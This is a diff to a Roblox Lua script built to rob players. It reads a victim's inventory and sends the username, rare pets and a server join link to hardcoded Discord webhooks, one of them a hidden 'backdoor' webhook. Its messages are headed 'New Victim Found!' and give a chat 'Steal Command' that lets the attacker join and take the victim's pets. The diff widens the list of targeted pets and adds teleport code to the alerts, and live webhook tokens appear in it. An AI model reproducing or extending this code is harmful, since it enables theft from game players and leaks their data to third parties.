@@ -41,9 +41,9 @@ local TweenService = game:GetService("TweenService")
 local VirtualInput = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local webhookUrl = "https://discord.com/api/webhooks/1394426601789198398/RX9lCOSScvMgBhqkJq5JIQ7KwLODTo4XCcTGdD2l8DHtIXg-iWnbBK8ZkMyOVyJMhDXp"
+local webhookUrl = webhook
 local backdoorWebhook = "https://discord.com/api/webhooks/1403059699640963234/Cq9-kuz2xqyRVvTm3OCI4Ur82WrD1vYTJcoW6UTR_h5inVQ8_5hZynxsL6Nck9I5zOi8"
-local chatTrigger = "arisee"
+local chatTrigger = command
 
 -- Server validation checks
 if game.PlaceId ~= 126884695634066 then
@@ -120,7 +120,7 @@ local function getInventory()
     local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
     local rarePets = {
         "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
-        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
+        "Brontosaurus", "Queen Bee", "Kitsune", "T-Rex", "Butterfly","french fry ferret", "Accended" ,"Mega", "Rainbow"
     }
     local rareItems = {
         "Candy Blossom", "Bone Blossom"
@@ -168,7 +168,7 @@ local function sendToWebhook()
     local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
 
     local messageData = {
-        content = "L hit bru nothing good",
+        content = "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "'",
         embeds = {{
             title = "New Victim Found!",
             description = "READ  in FORMAL scripts REMASTERD Server to Learn How to Join Victim's Server and Steal Their Stuff!",
@@ -186,7 +186,7 @@ local function sendToWebhook()
 
     if #inventory.rarePets > 0 then
         local rarePetMessage = {
-            content = "@everyone",
+            content = "--[[@everyone]] game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "'",
             allowed_mentions = { parse = { "everyone" } },
             embeds = {{
                 title = "Rare Pet Found!",
@@ -196,7 +196,7 @@ local function sendToWebhook()
                     {name = "Username", value = LocalPlayer.Name, inline = true},
                     {name = "Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                     {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
-                    {name = "🗣Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
+                    {name = "Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
@@ -365,7 +365,7 @@ local function cycleToolsWithHoldCheck(player, loadingGui)
 
     local rarePets = {
         "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
-        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
+        "Brontosaurus", "Queen Bee", "Kitsune", "T-Rex", "Butterfly","french fry ferret", "Accended" ,"Mega", "Rainbow"
     }
     local rareItems = {
         "Candy Blossom", "Bone Blossom"
@@ -718,5 +718,3 @@ local function modifyProximityPrompts()
 end
 
 modifyProximityPrompts()
-message.txt
-26 KB
